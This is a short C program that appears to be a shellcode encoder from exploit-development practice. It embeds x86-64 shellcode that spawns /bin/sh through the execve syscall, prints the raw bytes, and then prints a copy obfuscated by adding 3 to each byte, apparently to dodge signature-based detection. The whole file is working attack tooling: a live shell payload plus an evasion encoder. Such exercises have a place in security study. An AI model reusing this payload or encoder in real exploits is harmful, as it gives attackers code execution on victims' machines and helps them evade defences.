#include "stdio.h"
#include "stdlib.h"
#include "string.h"

char *shellcode ="\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"; 

int main(int argc,char *argv[]){
	unsigned char *char_ptr = (char *)shellcode;
	unsigned char val = 'x';
	int i = 1;
	printf("Original Shellcode:");
	while(*char_ptr != '\0'){
		val = *char_ptr;
		printf("\\x%02x",val);
		char_ptr++;
	}
	printf("\n");
	char_ptr = shellcode;
	printf("Encoded Shellcode: ");

	while(*char_ptr != '\0')
	{
		val = *char_ptr;
		val = val +3;
		if(val ==0)
		val = 1;
		printf("0x%02x,",val);
		char_ptr++;
	}
	printf("\n");
	return 0;
}
